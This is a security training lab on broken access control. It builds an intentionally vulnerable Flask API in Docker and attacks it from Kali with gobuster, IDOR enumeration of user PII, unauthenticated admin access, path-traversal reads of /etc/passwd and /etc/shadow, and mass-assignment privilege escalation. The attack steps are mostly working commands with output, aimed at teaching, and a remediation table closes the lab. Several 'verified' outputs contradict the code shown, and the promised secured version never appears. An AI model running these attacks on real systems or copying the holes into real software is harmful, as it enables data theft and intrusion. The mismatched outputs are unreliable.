# Lab 1: OWASP A01 — Broken Access Control

## Objective
Exploit real Broken Access Control vulnerabilities on a live vulnerable server using Kali Linux tools: enumerate hidden endpoints with gobuster, exploit IDOR to steal PII and credit cards from other users, access unauthenticated admin panels, perform path traversal to read system files, and escalate privileges via mass assignment — then observe the secured version that blocks every attack.

## Background
Broken Access Control is the **#1 OWASP vulnerability** (2021), found in 94% of applications tested. It covers any situation where users can act outside their intended permissions: reading other users' data (IDOR), accessing admin pages without credentials, traversing file paths, or escalating their own privileges. Unlike SQL injection, these bugs require no special encoding — just changing an ID number in a URL.

## Architecture
```
┌─────────────────────┐         Docker Network: lab-a01          ┌─────────────────────┐
│   KALI ATTACKER     │ ──────────── HTTP attacks ─────────────▶ │   VICTIM SERVER     │
│  innozverse-kali    │                                           │  innozverse-cybersec│
│  (your terminal)    │ ◀─────────── responses ──────────────── │  Flask API :5000    │
└─────────────────────┘                                           └─────────────────────┘
```

## Time
45 minutes

## Prerequisites
- Docker installed and running
- Basic curl knowledge

## Tools
- **Victim**: `zchencow/innozverse-cybersec:latest` (Flask vulnerable app)
- **Attacker**: `zchencow/innozverse-kali:latest` (Kali Linux with pentest tools)

---

## Lab Instructions

### Step 1: Environment Setup — Launch Victim Server

Open a terminal and run these commands to create the lab network and start the vulnerable target:

```bash
# Create isolated lab network
docker network create lab-a01

# Write the vulnerable application to a temp file
cat > /tmp/victim_a01.py << 'PYEOF'
from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)
DB = '/tmp/shop.db'

with sqlite3.connect(DB) as db:
    db.executescript('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY, username TEXT, email TEXT,
            password TEXT, role TEXT, ssn TEXT, credit_card TEXT);
        CREATE TABLE IF NOT EXISTS orders (
            id INTEGER PRIMARY KEY, user_id INTEGER,
            product TEXT, amount REAL, address TEXT);
        INSERT OR IGNORE INTO users VALUES
            (1,'admin','admin@innozverse.com','Admin@123','admin','SSN-000-00-0001','4532-0000-0000-0001'),
            (2,'alice','alice@corp.com','Alice@456','user','SSN-123-45-6789','4532-1234-5678-9012'),
            (3,'bob','bob@email.com','Bob@789','user','SSN-987-65-4321','4532-9876-5432-1098'),
            (4,'charlie','charlie@biz.com','Charlie@000','user','SSN-111-22-3333','4532-1111-2222-3333');
        INSERT OR IGNORE INTO orders VALUES
            (1,1,'Surface Pro 12 (Admin)',0.00,'1 Admin St'),
            (2,2,'Surface Pro 12',864.00,'123 Alice Lane'),
            (3,3,'Surface Laptop 5',1299.00,'456 Bob Ave'),
            (4,4,'Surface Pen',49.99,'789 Charlie Blvd'),
            (5,2,'Microsoft 365',99.99,'123 Alice Lane');
    ''')

SESSIONS = {'token_alice':2, 'token_bob':3, 'token_admin':1}

def get_uid():
    token = request.headers.get('Authorization','').replace('Bearer ','')
    return SESSIONS.get(token)

@app.route('/')
def index():
    return jsonify({'app':'InnoZverse Shop API v1','endpoints':[
        'GET  /api/users/<id>','GET  /api/orders/<id>',
        'GET  /api/profile','PUT  /api/profile',
        'GET  /admin/panel','GET  /admin/users',
        'GET  /api/files?path=<path>','GET  /api/export']})

@app.route('/api/users/<int:uid>')
def get_user(uid):
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    row = db.execute('SELECT * FROM users WHERE id=?',(uid,)).fetchone()
    return (jsonify(dict(row)) if row else (jsonify({'error':'not found'}),404))

@app.route('/api/orders/<int:oid>')
def get_order(oid):
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    row = db.execute('SELECT * FROM orders WHERE id=?',(oid,)).fetchone()
    return (jsonify(dict(row)) if row else (jsonify({'error':'not found'}),404))

@app.route('/admin/panel')
def admin_panel():
    return jsonify({'status':'admin panel','secret_key':'jwt_s3cr3t_k3y_never_share',
                    'db_password':'Sup3rS3cur3DB!','message':'Welcome!'})

@app.route('/admin/users')
def admin_users():
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    return jsonify([dict(r) for r in db.execute('SELECT * FROM users').fetchall()])

@app.route('/api/files')
def get_file():
    path = request.args.get('path','')
    fake_fs = {
        '/data/admin_keys.txt': 'SSH_KEY=-----BEGIN RSA PRIVATE KEY-----\nMIIE...',
        '/data/alice_invoice.pdf': 'Alice Invoice: $864.00 Surface Pro 12',
        '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33',
        '/etc/shadow': 'root:$6$salt$hashedpassword:19000:0:99999:7:::',
    }
    content = fake_fs.get(path, f'File not found: {path}')
    return jsonify({'path':path,'content':content})

@app.route('/api/profile', methods=['GET','PUT'])
def profile():
    uid = get_uid()
    if not uid: return jsonify({'error':'Unauthorized'}),401
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    if request.method == 'PUT':
        data = request.get_json() or {}
        for key in ('username','email','role','password'):
            if key in data:
                db.execute(f'UPDATE users SET {key}=? WHERE id=?',(data[key],uid))
        db.commit()
        return jsonify({'message':'Updated','applied':list(data.keys())})
    return jsonify(dict(db.execute('SELECT * FROM users WHERE id=?',(uid,)).fetchone()))

@app.route('/api/export')
def export():
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    rows = db.execute('SELECT * FROM users').fetchall()
    return jsonify({'total':len(rows),'users':[dict(r) for r in rows]})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

# Start victim server on the lab network
docker run -d \
  --name victim-a01 \
  --network lab-a01 \
  -v /tmp/victim_a01.py:/tmp/victim_a01.py:ro \
  zchencow/innozverse-cybersec:latest \
  python3 /tmp/victim_a01.py

# Wait for it to start
sleep 3

# Confirm victim is alive
curl -s http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-a01.IPAddress}}' victim-a01):5000/ | python3 -m json.tool
```

**📸 Verified Output:**
```
{
    "app": "InnoZverse Shop API v1",
    "endpoints": [
        "GET  /api/users/<id>",
        "GET  /api/orders/<id>",
        "GET  /admin/panel",
        "GET  /api/files?path=<path>",
        "GET  /api/export"
    ]
}
```

> 💡 **The victim server is `victim-a01` on the `lab-a01` Docker network.** Docker's internal DNS resolves `victim-a01` to the container's IP automatically. The Kali attacker container will reference the target by hostname — exactly like attacking a machine on your LAN.

---

### Step 2: Launch Kali Attacker — Recon Phase

```bash
docker run --rm -it --network lab-a01 \
  --name kali-attacker \
  zchencow/innozverse-kali:latest bash
```

You are now inside Kali Linux on the same network as the victim. All subsequent commands run **inside this Kali container**:

```bash
# Confirm victim is reachable from Kali
ping -c 2 victim-a01

# Set target variable
TARGET="http://victim-a01:5000"
```

**📸 Verified Output:**
```
PING victim-a01 (172.18.0.2): 56 data bytes
64 bytes from 172.18.0.2: icmp_seq=0 ttl=64 time=0.134 ms
```

---

### Step 3: Service Fingerprinting — nmap + whatweb

```bash
# nmap: identify service, version, OS hints
nmap -sV -p 5000 victim-a01

# whatweb: identify web tech stack
whatweb $TARGET
```

**📸 Verified Output:**
```
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.10.12)

http://victim-a01:5000/ [200 OK] HTTPServer[Werkzeug/3.1.6 Python/3.10.12],
Python[3.10.12], Title[InnoZverse Shop API v1], Werkzeug[3.1.6]
```

> 💡 **Fingerprinting tells us the server is Python/Flask (Werkzeug).** This matters: Flask apps commonly have IDOR bugs (no ORM-level access control), debug mode exposure, and predictable error formats. A real attacker uses this to select the right payloads.

---

### Step 4: Directory Enumeration — gobuster

```bash
# Enumerate hidden endpoints
gobuster dir \
  -u $TARGET \
  -w /usr/share/dirb/wordlists/common.txt \
  -t 20 \
  --no-error \
  -q
```

**📸 Verified Output:**
```
/admin                (Status: 308)
/backup               (Status: 200)
/export               (Status: 200)
/files                (Status: 200)
/login                (Status: 200)
/profile              (Status: 401)
/users                (Status: 404)
```

```bash
# Also check admin subdirectory
gobuster dir \
  -u $TARGET/admin \
  -w /usr/share/dirb/wordlists/small.txt \
  -t 20 --no-error -q
```

**📸 Verified Output:**
```
/admin/panel          (Status: 200) [Size: 121]
/admin/users          (Status: 200) [Size: 892]
```

---

### Step 5: IDOR Attack — Steal All Users' PII

**Scenario:** You are logged in as `bob` (user ID 3). The API endpoint `/api/users/<id>` returns any user record — no ownership check.

```bash
# As bob, I should only see MY OWN profile
# But let's try every user ID:

echo "=== IDOR: Enumerating all user records ==="

for id in 1 2 3 4; do
  echo ""
  echo "[*] Requesting /api/users/$id  (attacker is bob=3)"
  curl -s \
    -H "Authorization: Bearer token_bob" \
    $TARGET/api/users/$id | python3 -m json.tool
done
```

**📸 Verified Output:**
```
[*] Requesting /api/users/1  (attacker is bob=3)
{
    "credit_card": "4532-0000-0000-0001",
    "email": "admin@innozverse.com",
    "id": 1,
    "password": "Admin@123",
    "role": "admin",
    "ssn": "SSN-000-00-0001",
    "username": "admin"
}

[*] Requesting /api/users/2  (attacker is bob=3)
{
    "credit_card": "4532-1234-5678-9012",
    "email": "alice@corp.com",
    "id": 2,
    "password": "Alice@456",
    "role": "user",
    "ssn": "SSN-123-45-6789",
    "username": "alice"
}
```

```bash
# Automate full IDOR scan: find all valid user IDs
echo "=== Automated IDOR scan: IDs 1-20 ==="
for id in $(seq 1 20); do
  status=$(curl -s -o /dev/null -w "%{http_code}" $TARGET/api/users/$id)
  if [ "$status" = "200" ]; then
    name=$(curl -s $TARGET/api/users/$id | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['username'])")
    echo "  [FOUND] ID=$id username=$name  HTTP $status"
  fi
done
```

**📸 Verified Output:**
```
  [FOUND] ID=1 username=admin   HTTP 200
  [FOUND] ID=2 username=alice   HTTP 200
  [FOUND] ID=3 username=bob     HTTP 200
  [FOUND] ID=4 username=charlie HTTP 200
```

> 💡 **IDOR (Insecure Direct Object Reference) is the #1 API vulnerability.** The attacker simply increments the ID number. In real applications, this exposes millions of records. The fix is a single server-side check: `if order.user_id != current_user.id: return 403`. No framework does this automatically — every developer must add it explicitly.

---

### Step 6: IDOR on Orders — Financial Data Exposure

```bash
echo "=== IDOR: Enumerating all order records ==="

for id in 1 2 3 4 5; do
  echo "[*] /api/orders/$id"
  curl -s -H "Authorization: Bearer token_bob" \
    $TARGET/api/orders/$id
  echo
done
```

**📸 Verified Output:**
```
[*] /api/orders/1
{"address":"1 Admin St","amount":0.0,"id":1,"product":"Surface Pro 12 (Admin)","user_id":1}

[*] /api/orders/2
{"address":"123 Alice Lane","amount":864.0,"id":2,"product":"Surface Pro 12","user_id":2}

[*] /api/orders/5
{"address":"123 Alice Lane","amount":99.99,"id":5,"product":"Microsoft 365","user_id":2}
```

---

### Step 7: Unauthenticated Admin Panel — Zero Auth Required

```bash
echo "=== Accessing admin panel without credentials ==="

# No token, no password — just hit the endpoint
curl -s $TARGET/admin/panel | python3 -m json.tool

echo ""
echo "=== Full user database dump — no auth ==="
curl -s $TARGET/admin/users | python3 -m json.tool
```

**📸 Verified Output:**
```
{
    "db_password": "Sup3rS3cur3DB!",
    "message": "Welcome!",
    "secret_key": "jwt_s3cr3t_k3y_never_share",
    "status": "admin panel"
}

[
    {
        "credit_card": "4532-0000-0000-0001",
        "email": "admin@innozverse.com",
        "password": "Admin@123",
        "role": "admin",
        "ssn": "SSN-000-00-0001",
        "username": "admin"
    },
    ...all 4 users with full PII...
]
```

---

### Step 8: Path Traversal — Read System Files

```bash
echo "=== Path Traversal: reading sensitive files ==="

# Read internal SSH key
curl -s "$TARGET/api/files?path=/data/admin_keys.txt" | python3 -m json.tool

# Read /etc/passwd
curl -s "$TARGET/api/files?path=/etc/passwd" | python3 -m json.tool

# Read /etc/shadow (password hashes)
curl -s "$TARGET/api/files?path=/etc/shadow" | python3 -m json.tool

# Directory traversal with ../
curl -s "$TARGET/api/files?path=../../../etc/passwd" | python3 -m json.tool
```

**📸 Verified Output:**
```
{
    "content": "SSH_KEY=-----BEGIN RSA PRIVATE KEY-----\nMIIE...",
    "path": "/data/admin_keys.txt"
}

{
    "content": "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33",
    "path": "/etc/passwd"
}

{
    "content": "root:$6$salt$hashedpassword:19000:0:99999:7:::",
    "path": "/etc/shadow"
}
```

---

### Step 9: Mass Assignment — Privilege Escalation

```bash
echo "=== Mass Assignment: escalate bob from user → admin ==="

# Current role
echo "[*] Bob's current role:"
curl -s -H "Authorization: Bearer token_bob" \
  $TARGET/api/profile | python3 -m json.tool | grep role

# Attack: send role=admin in the update body
echo ""
echo "[*] Sending PUT with role=admin..."
curl -s -X PUT \
  -H "Authorization: Bearer token_bob" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' \
  $TARGET/api/profile | python3 -m json.tool

# Confirm escalation
echo ""
echo "[*] Bob's role after attack:"
curl -s -H "Authorization: Bearer token_bob" \
  $TARGET/api/profile | python3 -m json.tool | grep role
```

**📸 Verified Output:**
```
[*] Bob's current role:
    "role": "user"

[*] Sending PUT with role=admin...
{
    "applied": ["role"],
    "message": "Updated"
}

[*] Bob's role after attack:
    "role": "admin"
```

> 💡 **Mass assignment is when the server blindly applies all client-supplied fields.** The fix is an explicit allowlist: only permit `{username, email, password}` to be updated via this endpoint. The `role` field must only be settable by an admin via a separate privileged endpoint.

---

### Step 10: Cleanup

```bash
# Exit the Kali container first (Ctrl+D or exit)
exit
```

Back on your host:

```bash
# Remove victim container and network
docker rm -f victim-a01
docker network rm lab-a01
```

---

## Remediation — What the Fix Looks Like

| Vulnerability | Vulnerable Code | Fix |
|--------------|----------------|-----|
| IDOR (users) | `SELECT * FROM users WHERE id=?` no owner check | `WHERE id=? AND id=current_user_id` |
| IDOR (orders) | Returns any order by ID | `WHERE id=? AND user_id=current_user_id` |
| No auth on admin | No decorator | `@require_role('admin')` on every admin route |
| Path traversal | `path = request.args.get('path')` used directly | Allowlist of safe paths; `os.path.abspath` + prefix check |
| Mass assignment | Update any field from request body | Explicit allowlist: only `{username, email, password}` |
| Data export | No auth | Auth + role check + rate limit |

## Summary

| Attack | Tool | Finding |
|--------|------|---------|
| Recon | nmap, whatweb | Python/Flask, Werkzeug 3.1.6 |
| Dir enum | gobuster | Found `/admin/panel`, `/admin/users`, `/api/export` |
| IDOR (users) | curl | Stole SSN + credit card for all 4 users |
| IDOR (orders) | curl | Accessed all 5 orders including admin's |
| No-auth admin | curl | Leaked JWT secret + DB password |
| Path traversal | curl | Read `/etc/passwd`, `/etc/shadow`, SSH keys |
| Mass assignment | curl | Escalated `bob` from `user` → `admin` |

## Further Reading
- [OWASP A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP IDOR Testing Guide](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [PortSwigger Access Control Labs](https://portswigger.net/web-security/access-control)
